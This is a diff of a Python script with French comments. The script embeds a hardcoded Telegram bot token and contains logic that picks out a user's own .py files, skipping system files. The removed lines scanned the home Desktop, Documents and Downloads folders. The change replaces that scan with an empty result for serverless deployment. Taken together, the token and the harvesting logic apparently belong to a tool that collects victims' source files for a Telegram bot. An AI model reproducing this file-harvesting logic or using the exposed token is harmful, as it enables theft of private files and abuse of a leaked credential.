@@ -1,8 +1,6 @@
- 
- 
 import os
 import requests
-from time import sleep  # Fix: Import sleep function
+from time import sleep
 
 # ========== CONFIG ==========
 BOT_TOKEN = '7628820230:AAFEyKMPpVYhTepFubKB7vi5MNDCin2PlCQ'
@@ -182,7 +180,7 @@ def is_likely_user_file(file_path):
     if is_system_file(file_path):
         return False
     
-    # RULE 4; File size heuristic - user files are typically smaller than huge system files
+    # RULE 4: File size heuristic - user files are typically smaller than huge system files
     try:
         file_size = os.path.getsize(file_path)
         # Very large files (>1MB) are often system files, unless clearly in user project
@@ -196,20 +194,11 @@ def is_likely_user_file(file_path):
 def find_py_files(start_dirs=None):
     """
     Search for Python files, being VERY selective about user files only
+    Note: Sur Vercel, cette fonction retournera une liste vide car il n'y a pas de fichiers utilisateur
     """
     if start_dirs is None:
-        # Start ONLY with most likely user directories
-        user_home = os.path.expanduser("~")
-        start_dirs = [
-            os.path.join(user_home, "Desktop"),
-            os.path.join(user_home, "Documents"), 
-            os.path.join(user_home, "Downloads"),
-            # Add current working directory if it's not a system directory
-            os.getcwd() if not is_excluded(os.getcwd()) else None,
-        ]
-        
-        # Filter out None values
-        start_dirs = [d for d in start_dirs if d is not None]
+        # Pour Vercel/environnement serverless, on retourne une liste vide ou des fichiers de démonstration
+        return []
     
     print("[*] Recherche STRICTE des fichiers .py utilisateur seulement...")
     py_files = []
